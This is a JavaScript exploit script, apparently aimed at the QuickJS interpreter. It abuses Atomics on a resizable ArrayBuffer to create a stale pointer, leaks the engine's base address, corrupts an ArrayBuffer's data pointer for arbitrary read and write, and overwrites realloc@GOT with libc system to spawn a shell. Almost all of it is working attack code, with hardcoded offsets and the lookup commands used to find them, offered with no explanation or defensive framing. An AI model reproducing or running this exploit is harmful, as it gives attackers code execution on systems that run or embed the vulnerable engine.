// Exploit: Atomics + resizable ArrayBuffer stale pointer => corrupt JSArrayBuffer->data
// Then overwrite realloc@GOT with system and trigger system("sh") via ArrayBuffer.resize().

const OFF_js_array_buffer_free = 0x14bc0n;   // nm -an qjs | grep js_array_buffer_free
const OFF_got_realloc          = 0x10b2d8n;  // readelf -r qjs | grep realloc@GLIBC

const OFF_libc_realloc = 0xa3590n;           // nm -D libc.so.6 | grep realloc@@
const OFF_libc_system  = 0x53110n;           // nm -D libc.so.6 | grep system@@

function leak_qjs_base() {
  let ab = new ArrayBuffer(0x38, { maxByteLength: 0x2000 });
  let ta = new BigUint64Array(ab);
  // prevent realloc from extending in-place
  let blocker = new ArrayBuffer(0x1000);
  let victim;
  let mal = {
    valueOf() {
      ab.resize(0x400);
      victim = new ArrayBuffer(0x100);
      return 0n;
    }
  };
  let free_func = Atomics.add(ta, 6, mal);
  return free_func - OFF_js_array_buffer_free;
}

function make_mem_ab_with_data_ptr(ptr) {
  let ab = new ArrayBuffer(0x38, { maxByteLength: 0x2000 });
  let ta = new BigUint64Array(ab);
  let blocker = new ArrayBuffer(0x1000);
  let memAB;
  let mal = {
    valueOf() {
      ab.resize(0x400);
      memAB = new ArrayBuffer(0x100);
      return ptr;
    }
  };
  // overwrite JSArrayBuffer->data (offset 0x10 => index 2)
  Atomics.store(ta, 2, mal);
  return memAB;
}

// 1) Leak qjs base from JSArrayBuffer.free_func
let qjs_base = leak_qjs_base();

// 2) Create a corrupted ArrayBuffer whose data points to realloc@GOT
let got_realloc = qjs_base + OFF_got_realloc;
let memAB = make_mem_ab_with_data_ptr(got_realloc);
let memU64 = new BigUint64Array(memAB);

// 3) Resolve libc base from realloc@GLIBC in GOT, then compute system
let realloc_ptr = memU64[0];
let libc_base = realloc_ptr - OFF_libc_realloc;
let system_ptr = libc_base + OFF_libc_system;

// 4) Overwrite realloc@GOT with system
memU64[0] = system_ptr;

// 5) Trigger system("sh") by calling ArrayBuffer.resize(), passing pointer to "sh\0"
let cmd = new ArrayBuffer(0x20, { maxByteLength: 0x200 });
let u8 = new Uint8Array(cmd);
u8[0] = 0x73; // 's'
u8[1] = 0x68; // 'h'
u8[2] = 0;

// This will call system(cmd.data). The resize will likely throw/abort afterwards; that's OK.
try {
  cmd.resize(0x40);
} catch (e) {
  // ignore
}
